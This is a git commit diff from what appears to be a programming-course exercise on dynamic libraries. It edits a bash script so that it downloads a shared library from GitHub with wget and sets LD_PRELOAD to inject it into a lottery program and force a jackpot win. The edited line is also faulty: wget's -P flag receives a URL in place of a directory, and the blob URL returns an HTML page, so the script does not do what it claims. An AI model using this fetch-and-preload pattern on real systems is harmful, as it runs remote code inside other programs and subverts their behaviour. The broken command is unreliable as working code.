94bee4607dfc3d4c81415eff17c749b05e46b4a0
Benard Ronoh <biikate48@gmail.com>
2023-06-19 14:52:55 -0700

    Make Julien win Jackpot

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-https://github.com/Chatelo/alx-low_level_programming/blob/master/0x18-dynamic_libraries/chatelo.so
+wget -P https://github.com/Chatelo/alx-low_level_programming/blob/master/0x18-dynamic_libraries/chatelo.so
 export LD_PRELOAD=/tmp/chatelo.so
